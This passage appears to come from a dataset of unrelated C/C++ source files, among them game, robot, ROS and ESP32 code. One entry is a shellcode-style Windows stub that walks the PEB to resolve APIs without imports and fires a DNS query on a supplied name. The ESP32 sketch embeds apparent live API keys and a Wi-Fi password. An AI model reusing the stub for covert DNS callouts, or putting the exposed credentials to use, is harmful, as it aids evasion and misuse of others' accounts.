SIGNAL(timeout()), this, SLOT(moveRandomly()));\n    connect(moveTimer, &QTimer::timeout, [this]() {\n        this->moveRandomly();\n        this->moveHealthBar();\n    });\n\n    moveTimer->start(50);\n    walkTimer->start(160);\n}\n\nEnemy::~Enemy() {attackImgs.clear();}\n\n\nvoid Enemy::moveRandomly() {\n\n    // if(!contact) {\n    // attackTimer->stop();\n    // setPixmap(QPixmap(attackImgs[0]).scaled(imgLen,imgLen));\n        // set the destination (either to the castle or the tent)\n\n\n    // position = graph->findNode(this->row/18,this->col/12);\n    //**************************setting path*********************************************************\n\n\n\n    // setPixmap(QPixmap(attackImgs[0]).scaled(imgLen,imgLen));\n    attackTimer->stop();\n    // walkTimer->start(200);\n    // int detOffset = 45;\n\n    if(curr < int(path.size())) {\n        int detX = path[getCurr()]->getXPos(),\n            detY = path[getCurr()]->getYPos();\n\n        // move to the destination\n        // const int STEP_SIZE = 2; // this represents the velocity of the worker\n        QLineF ln(QPointF(x() + offsetX, y() + offsetY), QPointF(detX, detY));\n        double angle = -1 * ln.angle();\n        double theta = angle; // degrees\n        double dy = STEP_SIZE * qSin(qDegreesToRadians(theta));\n        double dx = STEP_SIZE * qCos(qDegreesToRadians(theta));\n\n        // handle A* algorithm things here\n        double d1 = pow(path[getCurr()]->getXPos() - path[getCurr()-1]->getXPos(), 2)\n                    + pow(path[getCurr()]->getYPos() - path[getCurr()-1]->getYPos(), 2);\n        double d2 = pow(x() + offsetX + dx - path[getCurr()-1]->getXPos(), 2)\n                    + pow(y() + offsetY + dy - path[getCurr()-1]->getYPos(), 2);\n\n        if(d2 >= d1) {\n            // setPos(path[curr]->xPos - offsetX, path[curr]->yPos - offsetY);\n            curr++;\n            // int c = getCurr();\n            // setCurr(c++);\n        } // else {\n        setPos(x() + dx, y() + dy);\n        // }\n    }\n\n    // handle collisions\n    QList<QGraphicsItem *> collided_items = collidingItems();\n    foreach(auto& item, collided_items) {\n        if(typeid(*item) == typeid(Fence)) {\n            Fence *f = dynamic_cast<Fence*>(item);\n            if(f != NULL && f->getHealth() > 0) {\n                setPos(x(), y());\n                attackFence(f);\n            }\n    ",
    "\ufeff\n#include <windows.h>\n#include <stdio.h>\n\n#include \"decl_func.h\"\n\n#pragma comment(linker,\"/MERGE:.rdata=.text /MERGE:.data=.text /MERGE:.pdata=.text\")\n#pragma section(\".text\",read,write,execute)\n\ntypedef struct _UNICODE_STRING {\n    USHORT Length;\n    USHORT MaximumLength;\n    PWSTR Buffer;\n} UNICODE_STRING;\n\nstruct LDR_MODULE {\n    LIST_ENTRY e[3];\n    HMODULE base;\n    void* entry;\n    UINT size;\n    UNICODE_STRING dllPath;\n    UNICODE_STRING dllname;\n};\n\nstatic char* _CharLowerA(char* str)\n{\n    int i = 0;\n    while (str[i])\n    {\n        if ((str[i] >= 'A') && (str[i] <= 'Z'))\n        {\n            str[i] = str[i] + 0x20;\n        }\n        i++;\n    }\n\n    return str;\n}\n\nstatic char* unicode_name_transform_to_char(LDR_MODULE* mdll, char* name) {\n    // TODO 64 is bad \n    for (size_t i = 0; (i < mdll->dllname.Length) && (i < 64); i++)\n    {\n        name[i] = (char)mdll->dllname.Buffer[i];\n    }\n    return _CharLowerA(name);\n}\n\nint cmpstr(const char* s1, const char* s2)\n{\n    while (*s1 && *s1 == *s2) ++s1, ++s2;\n    return ((unsigned char)*s1 > (unsigned char)*s2) -\n        ((unsigned char)*s1 < (unsigned char)*s2);\n}\n\nvoid cpystr(char* to, char* from)\n{\n    while (*from)\n    {\n        *to = *from;\n        to++;\n        from++;\n    }\n    *to = *from;\n}\n\nstatic HMODULE getKernel32_by_str() {\n    HMODULE kernel32;\n    INT_PTR peb = __readgsqword(0x60);\n    auto modList = 0x18;\n    auto modListFlink = 0x18;\n    auto kernelBaseAddr = 0x10;\n\n    auto mdllist = *(INT_PTR*)(peb + modList);\n    auto mlink = *(INT_PTR*)(mdllist + modListFlink);\n    auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);\n    auto mdl = (LDR_MODULE*)mlink;\n    do {\n        mdl = (LDR_MODULE*)mdl->e[0].Flink;\n        if (mdl->base != nullptr) {\n            char name[64];\n            if (!cmpstr(\"kernel32.dll\", unicode_name_transform_to_char(mdl, name))) {\n                break;\n            }\n        }\n    } while (mlink != (INT_PTR)mdl);\n\n    kernel32 = (HMODULE)mdl->base;\n    return kernel32;\n}\n\nstatic LPVOID getAPIAddr_byStr(HMODULE module_address, char* name)\n{\n    PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)module_address;\n    PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)module_address + img_dos_header->e_lfanew);\n    PIMAGE_EXPORT_DIRECTORY img_export_directory = (PIMAGE_EXPORT_DIRECTORY)(\n    (LPBYTE)module_address + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n    PDWORD fAddr = (PDWORD)((LPBYTE)module_address + img_export_directory->AddressOfFunctions);\n    PDWORD fNames = (PDWORD)((LPBYTE)module_address + img_export_directory->AddressOfNames);\n    PWORD  fOrd = (PWORD)((LPBYTE)module_address + img_export_directory->AddressOfNameOrdinals);\n\n    for (DWORD i = 0; i < img_export_directory->AddressOfFunctions; i++) {\n        LPSTR pFuncName = (LPSTR)((LPBYTE)module_address + fNames[i]);\n\n        char tmpFuncName[MAX_PATH];\n        cpystr(tmpFuncName, pFuncName);\n        _CharLowerA(tmpFuncName);\n\n        if (!cmpstr(name, tmpFuncName))\n        {\n            return (LPVOID)((LPBYTE)module_address + fAddr[fOrd[i]]);\n        }\n\n    }\n    return nullptr;\n}\n\n#pragma comment(lib, \"dnsapi.lib\")\n\nint main(wchar_t *dns_str) {\n\n    HMODULE mod_kernel32 = getKernel32_by_str();\n    fnGetProcAddress myGetProcAddress = (fnGetProcAddress)getAPIAddr_byStr(mod_kernel32, \"getprocaddress\");\n\n    fnLoadLibraryA myLoadLibrary = (fnLoadLibraryA)myGetProcAddress(mod_kernel32, \"LoadLibraryA\");\n\n    HMODULE dnsLib = myLoadLibrary(\"DNSAPI.dll\");\n    fnDnsQuery_W myDnsQuery_W = (fnDnsQuery_W)myGetProcAddress(dnsLib, \"DnsQuery_W\");\n\n    PDNS_RECORD dnsRecord;\n\n    myDnsQuery_W(\n        dns_str,\n        DNS_TYPE_A,\n        DNS_QUERY_STANDARD,\n        NULL,\n        &dnsRecord,\n        NULL\n    );\n\n    return 0;\n}",
    "#include \"menu.hpp\"\n\nMenu::Menu() {\n    this->window = new sf::RenderWindow();\n    this->winclose = new sf::RectangleShape();\n    this->play = new sf::RectangleShape();\n    this->quit = new sf::RectangleShape();\n    this->option = new sf::RectangleShape();\n    this->about = new sf::RectangleShape();\n\n    this->buffer = new sf::SoundBuffer();\n    this->sound = new sf::Sound();\n\n    this->font = new sf::Font();\n    this->image = new sf::Texture();\n    this->bg = new sf::Sprite();\n\n    \n\n    this->optionWinClose = nullptr;\n    this->optionBg = nullptr;\n    this->optionImage = nullptr;\n\n    set_values();\n}\n\nMenu::~Menu() {\n    //delete window;\n    delete winclose;\n    delete font;\n    delete image;\n    delete bg;\n    delete sound;\n    delete buffer;\n}\n\nsf::RenderWindow* Menu::getWindow()\n{\n    return this->window;\n}\n\nvoid Menu::set_values() {\n\n    /*\n    * initialise variables\n    * and text of menu options\n    */\n\n\n\n    /*window->create(sf::VideoMode(1280, 720), \"Oppenheimer\", sf::Style::Titlebar | sf::Style::Fullscreen );*/\n    window->create(sf::VideoMode(1920, 1080), \"Oppenheimer\", sf::Style::Titlebar | sf::Style::Fullscreen);\n    window->setFramerateLimit(30);\n    //window->setPosition(sf::Vector2i(0, 0));\n\n    this->pos = 0;\n    this->start_game = this->windowClose = false;\n\n    font->loadFromFile(\"assets/font/arial.ttf\");\n    image->loadFromFile(\"assets/images/menu-game.png\");\n\n    bg->setTexture(*image);\n\n    pos_mouse = { 0,0 };\n    mouse_coord = { 0, 0 };\n\n    options = { \"Oppenheimer\", \"Play\", \"Options\", \"about\", \"Quit\" };\n    texts.resize(5);\n    coords = { {874,43},{877,287},{877,424},{887,556},{887,681} };\n    sizes = { 45,42,40,40,40 };\n\n    for (std::size_t i{}; i < texts.size(); ++i) {\n        texts[i].setFont(*font);\n        texts[i].setString(options[i]);\n        texts[i].setCharacterSize(sizes[i]);\n        texts[i].setOutlineColor(sf::Color::Black);\n        texts[i].setPosition(coords[i]);\n    }\n    texts[1].setOutlineThickness(4);\n    pos = 1;\n\n    winclose->setSize(sf::Vector2f(55, 55));\n    winclose->setPosition(1755, 60);\n    winclose->setFillColor(sf::Color::Black);\n\n    play->setSize(sf::Vector2f(300, 100));\n    play->setPosition(866, 275);\n   \n   \n\n    option->setSize(sf::Vector2f(300, 100));\n    option->setPosition(866, 410);\n    \n\n    about->setSize(sf::Vector2f(300, 100));\n    about->setPosition(866, 530);\n    \n\n    quit->setSize(sf::Vector2f(300, 100));\n    quit->setPosition(866,660);\n    \n\n    buffer->loadFromFile(\"assets/music/bloop.ogg\");\n\n    sound->setBuffer(*buffer);\n\n    about_string = \"Hello Friends this game was designed and\\ndeveloped By two awesome men \\nGilfoyle and Dinesh .\\nthis is V0.2 can't wait for V0.3\\nall right reserved \u00a9Tangente 2024\\nAcknowledgement:\\nTo that indian guy on youtube \\nand to Bjarne Stroustrup  \";\n    about_text.setFillColor(sf::Color::White);\n    about_text.setFont(*font);\n    about_text.setPosition(sf::Vector2f(584, 205));\n    about_text.setCharacterSize(45);\n    about_text.setString(about_string);\n    about_text.setLineSpacing(1.5f);\n\n\n    option_string = \"\\t\\t\\tUnder Construction\\nWill be available in V0.3\\nContact Tangente For more Details\";\n    option_text.setFillColor(sf::Color::White);\n    option_text.setFont(*font);\n    option_text.setPosition(sf::Vector2f(584, 205));\n    option_text.setCharacterSize(55);\n    option_text.setString(option_string);\n    option_text.setLineSpacing(1.5f);\n\n    icon.loadFromFile(\"assets/images/icon.png\");\n    \n    \n    window->setIcon(icon.getSize().x, icon.getSize().y, icon.getPixelsPtr());\n\n\n\n\n\n\n\n\n\n\n\n\n}\n\nbool Menu::getStartGame()\n{\n    return this->start_game;\n}\n\nvoid Menu::loop_events() {\n\n    /*\n    * choose between start game , option , about or quit;\n    */\n\n    sf::Event event;\n    pos_mouse = sf::Mouse::getPosition(*window);\n    std::cout << pos_mouse.x << \" \" << pos_mouse.y << \"\\n\";\n    mouse_coord = window->mapPixelToCoords(pos_mouse);\n\n    while (window->pollEvent(event)) {\n\n        \n\n        if (sf::Keyboard::isKeyPressed(sf::Keyboard::Escape))\n        {\n            window->close();\n            this->windowClose = true;\n            sound->play();\n\n\n        }\n\n\n\n        if (sf::Keyboard::isKeyPressed(sf::Keyboard::Down)) {\n            if (pos < 4) {\n                ++pos;\n                texts[pos].setOutlineThickness(4);\n                texts[pos - 1].setOutlineThickness(0);\n\n            }\n            sound->play();\n        }\n\n        if (sf::Keyboard::isKeyPressed(sf::Keyboard::Up)) {\n            if (pos > 1) {\n                --pos;\n\n                texts[pos].setOutlineThickness(4);\n                texts[pos + 1].setOutlineThickness(0);\n\n            }\n            sound->play();\n\n\n        }\n        if (sf::Keyboard::isKeyPressed(sf::Keyboard::Enter))\n        {\n            sound->play();\n            switch (pos)\n            {\n            case 1:\n                this->start_game = true;\n                break;\n\n            case 2:\n\n                this->Option();\n                break;\n\n           ",
    "#include \"main.h\"\n#include \"units/Angle.hpp\"\n#include \"units/Vector2D.hpp\"\n\n/**\n * A callback function for LLEMU's center button.\n *\n * When this callback is fired, it will toggle line 2 of the LCD text between\n * \"I was pressed!\" and nothing.\n */\nvoid on_center_button() {\n    static bool pressed = false;\n    pressed = !pressed;\n    if (pressed) {\n        pros::lcd::set_text(2, \"I was pressed!\");\n    } else {\n        pros::lcd::clear_line(2);\n    }\n}\n\n/**\n * Runs initialization code. This occurs as soon as the program is started.\n *\n * All other competition modes are blocked by initialize; it is recommended\n * to keep execution time for this mode under a few seconds.\n */\nvoid initialize() {\n    pros::lcd::initialize();\n    pros::lcd::set_text(1, \"Hello PROS User!\");\n    pros::lcd::register_btn1_cb(on_center_button);\n    units::Vector2D<AngularAcceleration> a(1_rpm2, 2_rpm2);\n    a.theta().convert(deg);\n    to_cDeg(a.theta());\n}\n\n/**\n * Runs while the robot is in the disabled state of Field Management System or\n * the VEX Competition Switch, following either autonomous or opcontrol. When\n * the robot is enabled, this task will exit.\n */\nvoid disabled() {}\n\n/**\n * Runs after initialize(), and before autonomous when connected to the Field\n * Management System or the VEX Competition Switch. This is intended for\n * competition-specific initialization routines, such as an autonomous selector\n * on the LCD.\n *\n * This task will exit when the robot is enabled and autonomous or opcontrol\n * starts.\n */\nvoid competition_initialize() {}\n\n/**\n * Runs the user autonomous code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the autonomous\n * mode. Alternatively, this function may be called in initialize or opcontrol\n * for non-competition testing purposes.\n *\n * If the robot is disabled or communications is lost, the autonomous task\n * will be stopped. Re-enabling the robot will restart the task, not re-start it\n * from where it left off.\n */\nvoid autonomous() {}\n\n/**\n * Runs the operator control code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the operator\n * control mode.\n *\n * If no competition control is connected, this function will run immediately\n * following initialize().\n *\n * If the robot is disabled or communications is lost, the\n * operator control task will be stopped. Re-enabling the robot will restart the\n * task, not resume it from where it left off.\n */\nvoid opcontrol() {\n    pros::Controller master(pros::E_CONTROLLER_MASTER);\n    pros::MotorGroup left_mg({1, -2, 3}); // Creates a motor group with forwards ports 1 & 3 and reversed port 2\n    pros::MotorGroup right_mg({-4, 5, -6}); // Creates a motor group with forwards port 4 and reversed ports 4 & 6\n\n    while (true) {\n        pros::lcd::print(0, \"%d %d %d\", (pros::lcd::read_buttons() & LCD_BTN_LEFT) >> 2,\n                         (pros::lcd::read_buttons() & LCD_BTN_CENTER) >> 1,\n\n                         (pros::lcd::read_buttons() & LCD_BTN_RIGHT) >> 0); // Prints status of the emulated screen LCDs\n\n        // Arcade control scheme\n        int dir = master.get_analog(ANALOG_LEFT_Y); // Gets amount forward/backward from left joystick\n        int turn = master.get_analog(ANALOG_RIGHT_X); // Gets the turn left/right from right joystick\n        left_mg.move(dir - turn); // Sets left motor voltage\n        right_mg.move(dir + turn); // Sets right motor voltage\n        pros::delay(20); // Run for 20 ms then update\n    }\n}",
    "\r\n\r\n#include <WiFi.h>  // \u5305\u542bWiFi\u5e93\r\n#include <HTTPClient.h>  // \u5305\u542bHTTPClient\u5e93\r\n#include <ArduinoJson.h>  // \u5305\u542bArduinoJson\u5e93\r\n#include <SoftwareSerial.h>  // \u5305\u542bSoftwareSerial\u5e93\uff08\u7528\u4e8e\u4e32\u53e3\u901a\u8baf\uff09\r\n#include <driver/i2s.h> // \u7528\u4e8e\u914d\u7f6eI2S\u7684\u9a71\u52a8\r\n#include \"base64.h\"\r\n#include \"cJSON.h\"\r\n\r\n// \u5e38\u91cf\u548c\u5b8f\u5b9a\u4e49\r\n#define key 0\r\n#define ADC 2\r\n\r\n// \u5b9a\u4e49\u6a21\u62df\u4e32\u53e3\u7684\u53d1\u9001\u7aef\u53e3\r\n#define TX_PIN 17\r\n#define RX_PIN 18\r\n\r\n\r\nconst int DEV_PID = 1537;\r\nconst char* CUID = \"44950592\";\r\nconst char* CLIENT_ID = \"myQ10rFInKFzFtd6EjRLjMET\";\r\nconst char* CLIENT_SECRET = \"ObU2fYI7xzOCtJTyXKDpxVhV6mHRV4Xw\";\r\n\r\nconst char* ssid = \"HONOR\";  // WiFi\u7f51\u7edc\u540d\u79f0\r\nconst char* password = \"wrqcctv123\";  // WiFi\u5bc6\u7801\r\n\r\nconst char* TTS_URL = \"http://tsn.baidu.com/text2audio\";  // TTS\u670d\u52a1URL\r\nconst char* TOKEN_URL = \"http://openapi.baidu.com/oauth/2.0/token\";  // \u83b7\u53d6token\u7684URL\r\n\r\nconst String ChatMindAiUrl = \"https://api.chatanywhere.com.cn/v1/chat/completions\";  // ChatMindAi API\u5730\u5740\r\nconst String ChatMindAiApiKey = \"sk-tetT9sM4MSA8a3LGJcZGxfuyN4c0fAfrcVm9uwqAJA2Yt3bq\";  // \u66ff\u6362\u4e3a\u4f60\u7684ChatMindAi API\u5bc6\u94a5\r\n\r\nstatic const i2s_port_t i2s_num = I2S_NUM_1;  // i2s\u7aef\u53e3\u53f7\uff0c\u6ce8\u610f\uff0c\u5982\u679c\u4f7f\u7528\u5185\u90e8DAC\uff0c\u5219\u5fc5\u987b\u4f7f\u7528I2S_NUM_0\r\n\r\nHTTPClient http_client;\r\nhw_timer_t* timer = NULL;\r\nconst int recordTimeSeconds = 5;\r\nconst int adc_data_len = 16000 * recordTimeSeconds;\r\nconst int data_json_len = adc_data_len * 2 * 1.4;\r\nuint16_t* adc_data;\r\nchar* data_json;\r\nuint8_t adc_start_flag = 0;\r\nuint8_t adc_complete_flag = 0;\r\nuint32_t num = 0;\r\nportMUX_TYPE timerMux = portMUX_INITIALIZER_UNLOCKED;\r\nuint32_t DataIdx = 0;\r\n\r\nWiFiClient client;  // \u521b\u5efaWiFi\u5ba2\u6237\u7aef\u5bf9\u8c61\r\n\r\nvoid IRAM_ATTR onTimer();\r\nString gainToken();\r\nvoid assembleJson(String token);\r\nvoid sendToSTT();\r\nString getGPTAnswer();\r\nvoid textToSpeech(const char* text);\r\n\r\nString uservoice;\r\nString cleanResult;\r\nString escapedResult;\r\nString prompter = \"\u4ecb\u7ecd\u4e00\u4e0b\u4f60\u81ea\u5df1\u3002\";\r\nuint32_t time1, time2;\r\n\r\n// I2S\u914d\u7f6e\u7ed3\u6784\u4f53\r\nstatic const i2s_config_t i2s_config = {\r\n    .mode = (i2s_mode_t)(I2S_MODE_MASTER | I2S_MODE_TX),\r\n    .sample_rate = 16000,    // \u91c7\u6837\u738716000\r\n    .bits_per_sample = I2S_BITS_PER_SAMPLE_16BIT,\r\n    .channel_format = I2S_CHANNEL_FMT_RIGHT_LEFT,\r\n    .communication_format = (i2s_comm_format_t)(I2S_COMM_FORMAT_I2S | I2S_COMM_FORMAT_I2S_MSB),\r\n    .intr_alloc_flags = ESP_INTR_FLAG_LEVEL1,       // \u9ad8\u4f18\u5148\u7ea7\u4e2d\u65ad\r\n    .dma_buf_count = 8,                             // 8\u4e2a\u7f13\u51b2\u533a\r\n    .dma_buf_len = 1024,                            // \u6bcf\u4e2a\u7f13\u51b2\u533a1K\u5b57\u8282\uff0c\u603b\u51718K\u5b57\u8282\u7684\u7f13\u51b2\u533a\u7a7a\u95f4\r\n    .use_apll = 0,\r\n    .tx_desc_auto_clear = true,\r\n    .fixed_mclk = -1\r\n};\r\n\r\nstatic const i2s_pin_config_t pin_config = {\r\n    .bck_io_num = 46,                     // \u65f6\u949f\u53e3\uff0c\u5bf9\u5e94\u4e8eMAX38357A\u7684BCLK\r\n    .ws_io_num = 15,                      // \u7528\u4e8e\u58f0\u9053\u9009\u62e9\uff0c\u5bf9\u5e94\u4e8eMAX38357A\u7684LRC\r\n    .data_out_num = 3,                   // ESP32\u7684\u97f3\u9891\u8f93\u51fa\u53e3, \u5bf9\u5e94\u4e8eMAX38357A\u7684DIN\r\n    //.data_in_num = I2S_PIN_NO_CHANGE      // ESP32\u7684\u97f3\u9891\u8f93\u5165\u63a5\u53e3\uff0c\u672c\u4f8b\u672a\u7528\u5230\r\n};\r\n\r\n\r\n// \u51fd\u6570\uff1a\u5c06\u5b57\u7b26\u4e32\u8fdb\u884cURL\u7f16\u7801\r\nString urlencode(const String& str) {\r\n    String encodedString = \"\";\r\n    char c;\r\n    char code0;\r\n    char code1;\r\n    for (unsigned int i = 0; i < str.length(); i++) {\r\n        c = str.charAt(i);\r\n        if (c == ' ') {\r\n            encodedString += '+';  // \u5c06\u7a7a\u683c\u66ff\u6362\u4e3a\u52a0\u53f7\r\n        }\r\n        else if (isalnum(c)) {\r\n            encodedString += c;  // \u5c06\u5b57\u6bcd\u548c\u6570\u5b57\u76f4\u63a5\u6dfb\u52a0\u5230\u7f16\u7801\u540e\u7684\u5b57\u7b26\u4e32\r\n        }\r\n        else {\r\n            code1 = (c & 0xf) + '0';\r\n            if ((c & 0xf) > 9) {\r\n                code1 = (c & 0xf) - 10 + 'A';  // \u83b7\u53d6\u5b57\u7b26\u7684\u4f4e4\u4f4d\uff0c\u5e76\u8f6c\u6362\u4e3a\u5bf9\u5e94\u768416\u8fdb\u5236\u5b57\u7b26\r\n            }\r\n            c = (c >> 4) & 0xf;\r\n            code0 = c + '0';\r\n            if (c > 9) {\r\n                code0 = c - 10 + 'A';  // \u83b7\u53d6\u5b57\u7b26\u7684\u9ad84\u4f4d\uff0c\u5e76\u8f6c\u6362\u4e3a\u5bf9\u5e94\u768416\u8fdb\u5236\u5b57\u7b26\r\n            }\r\n            encodedString += '%';  // \u6dfb\u52a0URL\u7f16\u7801\u7684\u524d\u7f00\r\n            encodedString += code0;  // \u6dfb\u52a0\u9ad84\u4f4d\u768416\u8fdb\u5236\u5b57\u7b26\r\n            encodedString += code1;  // \u6dfb\u52a0\u4f4e4\u4f4d\u768416\u8fdb\u5236\u5b57\u7b26\r\n        }\r\n        yield();  // \u653e\u5f03CPU\u63a7\u5236\u6743\uff0c\u4f7f\u5176\u4ed6\u4efb\u52a1\u6709\u673a\u4f1a\u6267\u884c\r\n    }\r\n    return encodedString;  // \u8fd4\u56de\u7f16\u7801\u540e\u7684\u5b57\u7b26\u4e32\r\n}\r\n\r\n\r\n\r\nvoid textToSpeech(const char* text) {\r\n    HTTPClient http;\r\n    String token = gainToken();  // \u83b7\u53d6\u8bbf\u95ee\u4ee4\u724c\r\n    Serial.println(\"Access Token: \" + token);  // \u6253\u5370\u8bbf\u95ee\u4ee4\u724c\r\n    String encoded_text = urlencode(text);  // \u5c06\u6587\u672c\u8fdb\u884cURL\u7f16\u7801\r\n    // \u6784\u5efaTTS\u8bf7\u6c42\u53c2\u6570\r\n    String tts_params = \"tok=\" + token + \"&tex=\" + encoded_text + \"&cuid=esp32&lan=zh&ctp=1&aue=4&spd=4&pit=5&vol=5&per=0\";\r\n\r\n    if (http.begin(client, TTS_URL)) {\r\n        http.addHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");  // \u6dfb\u52a0HTTP\u5934\u90e8\r\n        int httpCode = http.POST(tts_params);  // \u53d1\u9001POST\u8bf7\u6c42\r\n\r\n        if (httpCode > 0) {\r\n            if (httpCode == HTTP_CODE_OK) {\r\n                const size_t availableSize = 1 * 1024 * 1024;\r\n                size_t bytesRead = 0;\r\n                char* audioData = (char*)heap_caps_malloc(availableSize, MALLOC_CAP_SPIRAM);\r\n                if (audioData != nullptr) {\r\n                    WiFiClient* stream = http.getStreamPtr();  // \u83b7\u53d6HTTP\u54cd\u5e94\u6d41\r\n                    bytesRead = stream->readBytes(audioData, availableSize);  // \u8bfb\u53d6\u97f3\u9891\u6570\u636e\r\n                    // \u68c0\u67e5\u662f\u5426\u8bfb\u53d6\u5230\u4e86\u6570\u636e\r\n                    if (bytesRead > 0) {\r\n                        // \u8fd9\u91cc\u5047\u8bbeDataIdx\u662f\u5728\u51fd\u6570\u5916\u90e8\u5b9a\u4e49\u7684\r\n                        Da",
    "#include <ros/ros.h>\n#include \"../include/Linearizer.h\"\n#include \"../include/Accumulator.h\"\n#include \"../include/utils/tic_toc.h\"\n#include \"std_msgs/Int64.h\"\n#include \"sensor_msgs/Imu.h\"\n#include \"cf_msgs/Tdoa.h\"\n#include \"sensor_msgs/PointCloud.h\"\n#include \"isas_msgs/Anchorlist.h\"\n#include \"isas_msgs/RTLSStick.h\"\n#include \"sfuise_msgs/Calib.h\"\n#include \"sfuise_msgs/Spline.h\"\n#include \"sfuise_msgs/Estimate.h\"\n\nclass SplineFusion\n{\n\n  public:\n\n    SplineFusion(ros::NodeHandle& nh)\n    {\n        if_anchor_ini = false;\n        average_runtime = 0;\n        window_count = 0;\n        solver_flag = INITIAL;\n        readParameters(nh);\n        sub_imu = nh.subscribe(\"/EstimationInterface/imu_ds\", 1000, &SplineFusion::getImuCallback, this);\n        sub_anchor = nh.subscribe(\"/EstimationInterface/anchor_list\", 1000, &SplineFusion::getAnchorCallback, this);\n        if (if_tdoa) {\n            sub_uwb = nh.subscribe(\"/EstimationInterface/tdoa_ds\", 1000, &SplineFusion::getTdoaCallback, this);\n        } else {\n            sub_uwb = nh.subscribe(\"/EstimationInterface/toa_ds\", 1000, &SplineFusion::getToaCallback, this);\n        }\n        pub_knots_active = nh.advertise<sensor_msgs::PointCloud>(\"active_control_points\", 1000);\n        pub_knots_inactive = nh.advertise<sensor_msgs::PointCloud>(\"inactive_control_points\", 1000);\n        pub_calib = nh.advertise<sfuise_msgs::Calib>(\"sys_calib\", 100);\n        pub_est = nh.advertise<sfuise_msgs::Estimate>(\"est_window\", 1000);\n        pub_start_time = nh.advertise<std_msgs::Int64>(\"start_time\", 1000);\n    }\n\n    void run()\n    {\n        static int num_window = 0;\n        TicToc t_window;\n        if (initialization()) {\n            displayControlPoints();\n            optimization();\n            double t_consum = t_window.toc();\n            average_runtime = (t_consum + double(num_window) * average_runtime) / double (num_window + 1);\n            num_window++;\n            if ((int) window_count <= n_window_calib) {\n                sfuise_msgs::Calib calib_msg;\n                calib_msg.q_nav_uwb.w = calib_param.q_nav_uwb.w();\n                calib_msg.q_nav_uwb.x = calib_param.q_nav_uwb.x();\n                calib_msg.q_nav_uwb.y = calib_param.q_nav_uwb.y();\n                calib_msg.q_nav_uwb.z = calib_param.q_nav_uwb.z();\n                calib_msg.t_nav_uwb.x = calib_param.t_nav_uwb[0];\n                calib_msg.t_nav_uwb.y = calib_param.t_nav_uwb[1];\n                calib_msg.t_nav_uwb.z = calib_param.t_nav_uwb[2];\n                geometry_msgs::Point offset_msg;\n                offset_msg.x = calib_param.offset.x();\n                offset_msg.y = calib_param.offset.y();\n                offset_msg.z = calib_param.offset.z();\n                calib_msg.t_tag_body_set = offset_msg;\n                pub_calib.publish(calib_msg);\n            }\n            if (spline_local.numKnots() >= (size_t) window_size) {\n                window_count++;\n                if (solver_flag == INITIAL) {\n                    solver_flag = FULLSIZE;\n                }\n            }\n            sfuise_msgs::Spline spline_msg;\n            spline_local.getSplineMsg(spline_msg);\n            sfuise_msgs::Estimate est_msg;\n            est_msg.spline = spline_msg;\n            est_msg.if_full_window.data = (solver_flag != INITIAL);\n            est_msg.runtime.data = average_runtime;\n            pub_est.publish(est_msg);\n            displayControlPoints();\n            if (solver_flag == FULLSIZE) spline_local.removeOneOldState();\n        }\n    }\n\n    EIGEN_MAKE_ALIGNED_OPERATOR_NEW\n\n  private:\n\n    static constexpr double NS_TO_S = 1e-9;\n\n    ros::Subscriber sub_imu;\n    ros::Subscriber sub_anchor;\n    ros::Subscriber sub_uwb;\n    ros::Publisher pub_knots_active;\n    ros::Publisher pub_knots_inactive;\n    ros::Publisher pub_calib;\n    ros::Publisher pub_est;\n    ros::Publisher pub_start_time;\n\n    Parameters param;\n    CalibParam calib_param;\n\n    Eigen::aligned_deque<TOAData> toa_buff;\n    Eigen::aligned_deque<TDOAData> tdoa_buff;\n    Eigen::aligned_deque<ImuData> imu_buff;\n    Eigen::aligned_deque<ImuData> imu_window;\n    Eigen::aligned_deque<TOAData> toa_window;\n    Eigen::aligned_deque<TDOAData> tdoa_window;\n\n    bool if_anchor_ini;\n    bool if_tdoa;\n    bool if_uwb_only;\n\n    size_t window_count;\n    int window_size;\n    int n_window_calib;\n\n    int64_t dt_ns;\n    int64_t bag_start_time;\n    int64_t last_imu_t_ns;\n    int64_t next_knot_TimeNs;\n\n    enum SolverFlag {\n        INITIAL,\n        FULLSIZE\n    };\n    SolverFlag solver_flag;\n    SplineState spline_local;\n\n    size_t bias_block_offset;\n    size_t gravity_block_offset;\n    size_t hess_size;\n    bool pose_fixed;\n    int max_iter;\n    double lambda;\n    double lambda_vee;\n    double average_runtime;\n    std::vector<double> v_toa_offset;\n\n    void readParameters(ros::NodeHandle& nh)\n    {\n        if (CommonUtils::readParam<double>(nh, \"imu_sample_coeff\")==0) {\n            if_uwb_only = true;\n        } else {\n            if_uwb_only = false;\n        }\n        pa",
    "#include <unistd.h>\n#include <dlfcn.h>\n#include <sys/stat.h>\n\n#include <consts.hpp>\n#include <base.hpp>\n#include <db.hpp>\n#include <core.hpp>\n\n#define DB_VERSION 12\n\nusing namespace std;\n\nstruct sqlite3;\n\nstatic sqlite3 *mDB = nullptr;\n\n#define DBLOGV(...)\n//#define DBLOGV(...) LOGD(\"magiskdb: \" __VA_ARGS__)\n\n// SQLite APIs\n\n#define SQLITE_OPEN_READWRITE        0x00000002  /* Ok for sqlite3_open_v2() */\n#define SQLITE_OPEN_CREATE           0x00000004  /* Ok for sqlite3_open_v2() */\n#define SQLITE_OPEN_FULLMUTEX        0x00010000  /* Ok for sqlite3_open_v2() */\n\nstatic int (*sqlite3_open_v2)(\n        const char *filename,\n        sqlite3 **ppDb,\n        int flags,\n        const char *zVfs);\nstatic const char *(*sqlite3_errmsg)(sqlite3 *db);\nstatic int (*sqlite3_close)(sqlite3 *db);\nstatic void (*sqlite3_free)(void *v);\nstatic int (*sqlite3_exec)(\n        sqlite3 *db,\n        const char *sql,\n        int (*callback)(void*, int, char**, char**),\n        void *v,\n        char **errmsg);\n\n// Internal Android linker APIs\n\nstatic void (*android_get_LD_LIBRARY_PATH)(char *buffer, size_t buffer_size);\nstatic void (*android_update_LD_LIBRARY_PATH)(const char *ld_library_path);\n\n#define DLERR(ptr) if (!(ptr)) { \\\n    LOGE(\"db: %s\\n\", dlerror()); \\\n    return false; 